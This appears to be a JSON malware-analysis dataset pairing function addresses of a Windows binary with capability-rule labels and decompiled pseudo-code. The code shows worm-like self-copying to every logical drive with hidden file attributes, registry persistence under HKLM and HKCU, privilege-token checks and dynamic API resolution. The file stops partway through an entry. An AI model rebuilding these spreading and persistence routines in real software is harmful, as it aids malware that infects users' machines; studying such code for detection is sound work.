{
    "00401000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00401000(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_8h_02;\n    int32_t arg_ch_00;\n    int32_t lpBuffer;\n    int32_t lpBuffer_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 36864 named .text\n    var_ch = 0;\n    arg_ch = fcn.00403c7a();\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    arg_8h = fcn.00403bb3(0xf);\n    arg_8h_00 = fcn.00406347(0xb, 0);\n    arg_8h_01 = fcn.00406347(0xc, 0);\n    arg_8h_02 = fcn.00406347(0x14, 0);\n    arg_ch_00 = fcn.00406347(0x16, 0);\n    var_4h = fcn.00409041(0x20a);\n    var_8h = 0;\n    lpBuffer = fcn.00403c29(0xd, arg_ch);\n    lpBuffer_00 = fcn.00403c29(0xe, arg_ch);\n    uVar4 = 0;\n    if (var_4h != 0) {\n        if (arg_8h != 0) {\n            fcn.004035d2(&var_8h);\n        }\n        if ((arg_8h_02 != 0) && (iVar2 = fcn.004090c6(arg_8h_02),  iVar2 != 0)) {\n            do {\n                if (((uVar1 & 1 << (uVar4 & 0x1f)) != 0) && (iVar2 = fcn.004035d2(&var_8h),  iVar2 == 0)) break;\n                uVar4 = uVar4 + 1;\n                uVar3 = fcn.004090c6(arg_8h_02);\n            } while (uVar4 < uVar3);\n        }\n        if (var_8h != 0) {\n            var_18h = 0;\n            iVar2 = fcn.004035a4(0);\n            while (iVar2 != 0) {\n                if (((arg_8h_00 != 0) && (lpBuffer != 0)) && (iVar2 = fcn.004059f1(var_4h, 0x104, 3),  iVar2 != 0)) {\n                    fcn.004090b5(lpBuffer);\n                    iVar2 = fcn.00403969(var_4h, lpBuffer);\n                    if (iVar2 != 0) {\n                        if (arg_ch_00 != 0) {\n                            fcn.00403e9e(var_4h, arg_ch_00);\n                        }\n                        var_ch = var_ch + 1;\n                    }\n                }\n                if (((arg_8h_01 != 0) && (lpBuffer_00 != 0)) && (iVar2 = fcn.004059f1(var_4h, 0x104, 3),  iVar2 != 0)) {\n                    fcn.004090b5(lpBuffer_00);\n                    iVar2 = fcn.00403969(var_4h, lpBuffer_00);\n                    if (iVar2 != 0) {\n                        var_ch = var_ch + 1;\n                    }\n                }\n                var_18h = var_18h + 1;\n                iVar2 = fcn.004035a4(var_18h);\n            }\n        }\n    }\n    fcn.004039da(arg_ch_00);\n    fcn.004039da(arg_8h);\n    fcn.004039da(arg_8h_00);\n    fcn.004039da(arg_8h_01);\n    fcn.004039da(arg_8h_02);\n    fcn.004039f9(lpBuffer);\n    fcn.004039f9(lpBuffer_00);\n    if (var_4h != 0) {\n        fcn.004090a1(var_4h);\n    }\n    if (var_8h != 0) {\n        fcn.004090a1(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 1114
    },
    "00401236": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00401236(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint lpSubKey;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpExistingFileName;\n    \n    var_34h = 0;\n    lpSubKey = fcn.00406347(0x11, 0);\n    var_2ch = fcn.00403bb3(0x10);\n    var_30h = fcn.00403bb3(0x12);\n    var_18h = fcn.00403bb3(0x43);\n    var_1ch = fcn.00409041(0x20a);\n    lpExistingFileName = fcn.00409041(0x20a);\n    var_8h = fcn.00409041(0x20a);\n    arg_8h = fcn.00409041(0x20a);\n    var_ch = fcn.00409041(0x20a);\n    var_10h = fcn.00409041(0x20a);\n    var_14h = 0;\n    if ((arg_8h != 0) && (lpExistingFileName != 0)) {\n        iVar1 = fcn.00405b0e(lpExistingFileName);\n        if ((iVar1 != 0) && ((var_8h != 0 && (var_1ch != 0)))) {\n            iVar1 = fcn.00405b20(var_1ch);\n            if (iVar1 != 0) {\n                iVar1 = fcn.004059f1(var_8h, 0x104, 3);\n                if ((iVar1 != 0) && (var_ch != 0)) {\n                    iVar1 = fcn.00405b7c(var_ch, 0);\n                    if ((iVar1 != 0) && (var_10h != 0)) {\n                        iVar1 = fcn.00405b7c(var_10h, 1);\n                        if (iVar1 != 0) {\n                            iVar1 = fcn.004059f1(arg_8h, 0x104, 3);\n                            if (iVar1 != 0) {\n                                iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, arg_8h, 0);\n                                if (iVar1 != 0) {\n                                    var_24h = fcn.004090c6(arg_8h);\n                                    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                                                      (0x80000002, lpSubKey, 0, 0x20106, &var_34h);\n                                    if (iVar1 == 0) {\n                                        var_24h = fcn.00403a93(var_ch, arg_8h);\n                                    }\n                                    else {\n                                        var_24h = 0;\n                                    }\n                                    fcn.004090c6(arg_8h);\n                                    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                                                      (0x80000001, lpSubKey, 0, 0x20106, &var_20h);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.00403a93(var_ch, arg_8h);\n                                    }\n                                    else {\n                                        iVar1 = 0;\n                                    }\n                                    var_34h = 0 < iVar1 || 0 < var_24h;\n                                    iVar1 = fcn.004059f1(arg_8h, 0x104, 3);\n                                    if (iVar1 != 0) {\n                                        (*_sym.imp.KERNEL32.dll_CopyFileW)(var_8h, arg_8h, 1);\n                                        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(arg_8h);\n                                        if (uVar2 != 0xffffffff) {\n                                            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(arg_8h, uVar2 | 2);\n                                        }\n                                    }\n                                }\n                                if (var_30h != 0) {\n                                    fcn.004035d2(&var_14h);\n                                    if (var_14h != 0) {\n                                        var_20h = 0;\n                                        while( true ) {\n                                            var_24h = fcn.004035a4(var_20h);\n                                            if (var_24h == 0) break;\n                                            iVar1 = fcn.004059f1(arg_8h, 0x104, 3);\n                                            if (iVar1 != 0) {\n                                                (*_sym.imp.KERNEL32.dll_CopyFileW)(lpExistingFileName, arg_8h, 1);\n                                                iVar1 = fcn.004059f1(arg_8h, 0x104, 3);\n                                                if (iVar1 != 0) {\n                                                    (*_sym.imp.KERNEL32.dll_CopyFileW)(var_8h, arg_8h, 1);\n                                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(arg_8h);\n                                                    if (uVar2 != 0xffffffff) {\n                                                        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)(arg_8h, uVar2 | 2);\n                                                    }\n                                                }\n                                            }\n                                            var_20h = var_20h + 1;\n                                        }\n                                        fcn.004090a1(var_14h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.004039da(var_18h);\n    fcn.004039da(var_1ch);\n    fcn.004039da(lpExistingFileName);\n    fcn.004039da(var_8h);\n    fcn.004039da(arg_8h);\n    fcn.004039da(var_ch);\n    fcn.004039da(var_10h);\n    fcn.004039da(lpSubKey);\n    fcn.004039da(var_2ch);\n    fcn.004039da(var_30h);\n    return var_34h;\n}\n",
        "token_count": 1423
    },
    "00401706": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401706(uint hostlong)\n\n{\n    uint16_t *arg_8h;\n    uint32_t *arg_8h_00;\n    uint32_t *arg_8h_01;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *arg_8h_02;\n    uint arg_10h;\n    uint var_cch;\n    uint var_48h;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    \n    var_1ch = 0;\n    arg_8h = fcn.00406347(1, 0);\n    arg_8h_00 = fcn.00406347(0x13, &var_8h);\n    arg_8h_01 = fcn.00406347(0x32, 0);\n    var_ch = fcn.00406347(2, &var_10h);\n    var_14h = fcn.00406347(3, &var_18h);\n    if (((arg_8h != NULL) && (var_ch != 0)) && (var_14h != 0)) {\n        var_28h = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n        var_24h = *arg_8h;\n        fcn.00408fd7(&var_48h, var_ch, 0x20);\n        uVar1 = fcn.004085d9(var_10h);\n        *arg_8h_00 = *arg_8h_00 ^ uVar1 & *arg_8h_01;\n        if (*arg_8h_00 == 0) {\n            *arg_8h_01 = 0x20;\n        }\n        else {\n            *arg_8h_01 = var_8h >> 1;\n        }\n        iVar2 = fcn.004078a3(&var_48h);\n        if (iVar2 != 0) {\n            var_8h = 0;\n            fcn.0040752a(&var_8h, var_ch, var_10h, var_14h, var_18h);\n            arg_8h_02 = &var_48h;\n            arg_10h = 0x28;\n            iVar2 = fcn.00407686(arg_8h_02, 0x28);\n            var_20h = 0 < iVar2;\n            fcn.004075ef(var_8h, arg_8h_02, arg_10h);\n            if (var_20h != 0) {\n                var_1ch = fcn.00408633(&var_48h, &var_cch);\n            }\n        }\n    }\n    fcn.00408fa9(&var_48h, 0, 0x28);\n    fcn.004039b7(arg_8h_00, 4);\n    fcn.004039b7(arg_8h_01, 4);\n    fcn.004039b7(var_ch, var_10h);\n    fcn.004039b7(var_14h, var_18h);\n    fcn.004039b7(arg_8h, 2);\n    return var_1ch;\n}\n",
        "token_count": 772
    },
    "00402161": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402161(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_18h;\n    int32_t iVar1;\n    int32_t var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    var_14h = NULL;\n    var_10h = 0;\n    var_8h = 0x10c;\n    arg_8h_00 = fcn.00409041(0x21a);\n    var_4h = 0;\n    var_ch = arg_8h_00;\n    arg_18h = fcn.0040530c();\n    fcn.00403955(*(arg_8h + 0xc), 0x3a, 0);\n    if (arg_18h != 0) {\n        if (arg_8h_00 != 0) {\n            fcn.00408fd7(arg_8h_00, L\"\\\\\\\\?\\\\UNC\\\\\\\\\\\\e-\", 0x10);\n            var_8h = var_8h + -8;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(arg_8h_00 + 0x10, &var_8h);\n            if (iVar1 != 0) {\n                fcn.004035d2(&var_4h);\n            }\n            iVar1 = fcn.00405962();\n            while (iVar1 == 0) {\n                fcn.00401e10(1, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401e10(4, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401e10(5, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401e10(3, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00401e10(2, 0, arg_8h, &var_4h, arg_18h, 0x80);\n                fcn.00403955(*(arg_8h + 0xc), 0x3c, 0);\n                var_14h = &var_4h;\n                var_18h = arg_8h;\n                var_10h = arg_18h;\n                fcn.00405230(&var_18h);\n                fcn.0040542b();\n                if (var_4h != 0) {\n                    fcn.004090a1(var_4h);\n                    var_4h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar1 = fcn.00405962();\n                arg_8h_00 = var_ch;\n            }\n        }\n        fcn.004052de();\n    }\n    if (var_4h != 0) {\n        fcn.004090a1(var_4h);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004090a1(arg_8h_00);\n    }\n    fcn.00403955(*(arg_8h + 0xc), 0x3b, 0);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 815
    },
    "0040239a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040239a(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00403e39();\n    fcn.00403955(*arg_8h, 0x3f, 0);\n    do {\n        iVar2 = fcn.00405962();\n        if (iVar2 != 0) {\n            iVar2 = fcn.00405962();\n            if (iVar2 != 0) {\n                fcn.00403955(*arg_8h, 0x40, 0);\n                return 0;\n            }\n        }\n        iVar2 = fcn.00404f7a(iVar1 == 0);\n        if (iVar2 == 0) {\n            if (iVar1 == 0) {\n                puVar3 = arg_8h[1];\n            }\n            else {\n                puVar3 = arg_8h[2];\n            }\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar3 + 1);\n            *puVar3 = 1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar3 + 1);\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 299
    },
    "00402504": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402504(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int16_t *piVar7;\n    uint var_10h;\n    int32_t var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    iVar3 = fcn.004090c6(arg_8h);\n    piVar4 = fcn.004092e1(arg_8h);\n    piVar5 = fcn.00409041(iVar3 * 2 + 2);\n    var_8h = NULL;\n    uVar2 = 2;\n    piVar6 = piVar5;\n    piVar7 = piVar4;\ncode_r0x00402541:\n    do {\n        iVar1 = *piVar7;\n        if ((iVar1 == 0) || (iVar1 == 10)) {\n            *piVar6 = 0;\n            if ((var_ch < 1) && (((piVar6 - piVar5 & 0xfffffffeU) != 0 && (iVar3 = fcn.004025f3(arg_ch),  iVar3 == 0))))\n            {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = (*piVar7 != 0) + 1;\n            }\n            var_8h = NULL;\n            piVar6 = piVar5;\n            var_ch = var_ch + -1;\n        }\n        else if (iVar1 != 0xd) {\n            if (iVar1 == 0x20) {\n                if (uVar2 == 2) {\n                    *piVar6 = 0;\n                    piVar6 = piVar6 + 1;\n                    uVar2 = 3;\n                    var_8h = piVar6;\n                    goto code_r0x00402541;\n                }\n                if (piVar6 == var_8h) goto code_r0x004025bf;\n            }\n            *piVar6 = iVar1;\n            piVar6 = piVar6 + 1;\n        }\ncode_r0x004025bf:\n        piVar7 = piVar7 + 1;\n        if (uVar2 < 2) {\n            if (piVar5 != NULL) {\n                fcn.004090a1(piVar5);\n            }\n            if (piVar4 != NULL) {\n                fcn.004090a1(piVar4);\n            }\n            return uVar2 == 1;\n        }\n    } while( true );\n}\n",
        "token_count": 595
    },
    "004025f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004025f3(uint *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint16_t *in_ECX;\n    bool bVar4;\n    \n    if (in_ECX[1] != 0) {\n        return 0;\n    }\n    uVar1 = *in_ECX;\n    if (uVar1 < 100) {\n        if (uVar1 != 99) {\n            if (0x4c < uVar1) {\n                if (uVar1 == 0x4d) goto code_r0x004026e2;\n                if (uVar1 == 0x4e) goto code_r0x0040270c;\n                if (uVar1 == 0x53) goto code_r0x00402704;\n                bVar4 = uVar1 == 0x58;\n                goto code_r0x004026f6;\n            }\n            if (uVar1 == 0x4c) {\ncode_r0x0040268a:\n                uVar2 = fcn.004092e1();\n                arg_8h[5] = uVar2;\n                iVar3 = fcn.004090c6();\n                iVar3 = fcn.00409041(iVar3 * 2 + 6);\n                arg_8h[6] = iVar3;\n                if (iVar3 != 0) {\n                    fcn.0040927d(iVar3, 0x40a3ac);\n                    fcn.004092b4(arg_8h[6]);\n                    return 1;\n                }\n                return 1;\n            }\n            if (uVar1 != 0x43) {\n                if (uVar1 != 0x45) {\n                    if (uVar1 == 0x46) goto code_r0x004026c9;\n                    if (uVar1 != 0x49) {\n                        return 0;\n                    }\n                    goto code_r0x0040263a;\n                }\n                goto code_r0x004026d1;\n            }\n        }\n        arg_8h[1] = 1;\n    }\n    else {\n        if (uVar1 < 0x6e) {\n            if (uVar1 == 0x6d) {\ncode_r0x004026e2:\n                *arg_8h = 1;\n                return 1;\n            }\n            if (uVar1 == 0x65) {\ncode_r0x004026d1:\n                arg_8h = arg_8h + 9;\n            }\n            else {\n                if (uVar1 == 0x66) {\ncode_r0x004026c9:\n                    arg_8h[4] = 1;\n                    return 1;\n                }\n                if (uVar1 != 0x69) {\n                    if (uVar1 != 0x6c) {\n                        return 0;\n                    }\n                    goto code_r0x0040268a;\n                }\ncode_r0x0040263a:\n                arg_8h = arg_8h + 7;\n            }\n        }\n        else {\n            if (uVar1 == 0x6e) {\ncode_r0x0040270c:\n                arg_8h[2] = 1;\n                return 1;\n            }\n            if (uVar1 == 0x73) {\ncode_r0x00402704:\n                arg_8h[3] = 1;\n                return 1;\n            }\n            bVar4 = uVar1 == 0x78;\ncode_r0x004026f6:\n            if (!bVar4) {\n                return 0;\n            }\n            arg_8h = arg_8h + 8;\n        }\n        fcn.004035d2(arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 851
    },
    "004030af": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.004030af(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t *unaff_ESI;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (unaff_ESI[5] < unaff_EBX) {\n        if (*unaff_ESI == 0) {\n            iVar2 = fcn.00409041();\n        }\n        else {\n            iVar2 = fcn.0040907a(*unaff_ESI);\n        }\n        if (iVar2 != 0) {\n            uVar1 = unaff_ESI[2];\n            if ((unaff_ESI[3] < uVar1) || ((uVar1 == unaff_ESI[3] && (unaff_ESI[4] != 0)))) {\n                fcn.00408ffc(((uVar1 - *unaff_ESI) - unaff_ESI[5]) + iVar2 + unaff_EBX, (uVar1 - *unaff_ESI) + iVar2, \n                             unaff_ESI[1] - uVar1);\n                iVar3 = *unaff_ESI;\n                unaff_ESI[2] = unaff_ESI[2] + ((iVar2 - iVar3) - unaff_ESI[5]) + unaff_EBX;\n            }\n            else {\n                iVar3 = *unaff_ESI;\n                unaff_ESI[2] = (uVar1 - iVar3) + iVar2;\n            }\n            unaff_ESI[3] = unaff_ESI[3] + (iVar2 - iVar3);\n            *unaff_ESI = iVar2;\n            unaff_ESI[1] = iVar2 + unaff_EBX;\n            unaff_ESI[5] = unaff_EBX;\n            var_4h = unaff_EBX;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 455
    },
    "00403585": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403585(int16_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) {\n        while (*param_1 != 0) {\n            do {\n                piVar3 = param_1;\n                iVar2 = iVar1;\n                param_1 = piVar3 + 1;\n                iVar1 = iVar2 + 1;\n            } while (*param_1 != 0);\n            iVar1 = iVar2 + 2;\n            param_1 = piVar3 + 2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "00403772": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403772(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    \n    iVar1 = fcn.00409041(0x20);\n    iVar2 = fcn.00409041(0x20a);\n    arg_8h_00 = fcn.00409041(0x20a);\n    if (iVar1 != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(iVar1, 4000);\n        if (iVar3 == 0) {\n            fcn.004090a1(iVar1);\n            iVar1 = 0;\n        }\n        if (arg_ch == 0) {\n            *(iVar1 + 0x1c) = 0xffffffff;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_AllocConsole)();\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(0xfffffff5);\n            *(iVar1 + 0x1c) = uVar4;\n        }\n        if (((arg_8h != 0) && (arg_8h_00 != 0)) && (iVar2 != 0)) {\n            iVar3 = fcn.00405b20(iVar2);\n            if (iVar3 != 0) {\n                iVar3 = fcn.004059f1(arg_8h_00, 0x104, 3);\n                if (iVar3 != 0) {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg_8h_00, 0x40000000, 1, 0, 2, 0, 0);\n                    *(iVar1 + 0x18) = uVar4;\n                    goto code_r0x0040382b;\n                }\n            }\n        }\n        *(iVar1 + 0x18) = 0xffffffff;\n    }\ncode_r0x0040382b:\n    if (iVar2 != 0) {\n        fcn.004090a1(iVar2);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004090a1(arg_8h_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 526
    },
    "004038da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038da(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint lpWideCharStr;\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x1c) != -1) || (*(in_ECX + 0x18) != -1)) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        if (arg_8h != 0) {\n            lpWideCharStr = fcn.00402fb5(arg_8h);\n            fcn.00403848(lpWideCharStr);\n            fcn.004039da(lpWideCharStr);\n        }\n        for (; *in_EAX != 0; in_EAX = in_EAX + 1) {\n            fcn.00403848(*in_EAX);\n        }\n        fcn.00403848(0x40a3b8);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    }\n    return 0;\n}\n",
        "token_count": 220
    },
    "004039b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039b7(int32_t arg_8h, uint arg_ch)\n\n{\n    if (arg_8h != 0) {\n        fcn.00408fa9(arg_8h, 0, arg_ch);\n        fcn.004090a1(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "004039da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039da(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    \n    if (arg_8h != 0) {\n        arg_ch = fcn.004090c6(arg_8h);\n        fcn.004039b7(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "004039f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039f9(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    \n    if (arg_8h != 0) {\n        arg_ch = fcn.004090b5(arg_8h);\n        fcn.004039b7(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "00403d4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d4b(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00406347(0x1a, &var_8h);\n    iVar1 = fcn.004090b5(arg_8h_00);\n    iVar1 = iVar1 + 1 + arg_8h_00;\n    var_4h = 2;\n    iVar4 = arg_8h_00;\n    do {\n        var_4h = var_4h + -1;\n        iVar2 = fcn.004090b5(iVar4);\n        iVar4 = iVar4 + 1 + iVar2;\n    } while (var_4h != 0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00);\n    if (iVar2 != 0) {\n        if (arg_ch != 0) {\n            iVar1 = iVar4;\n        }\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, iVar1);\n        if (pcVar3 != NULL) {\n            (*pcVar3)(arg_8h);\n        }\n    }\n    fcn.004039b7(arg_8h_00, var_8h);\n    return;\n}\n",
        "token_count": 343
    },
    "00403e39": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00403e39(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    TokenHandle = 0;\n    if (uVar1 < 6) {\n        uVar3 = 1;\n    }\n    else {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        uVar3 = 0;\n        if (iVar2 != 0) {\n            ReturnLength = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength)\n            ;\n            if (iVar2 != 0) {\n                uVar3 = TokenInformation;\n            }\n        }\n        if (TokenHandle != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 263
    },
    "00403ee1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
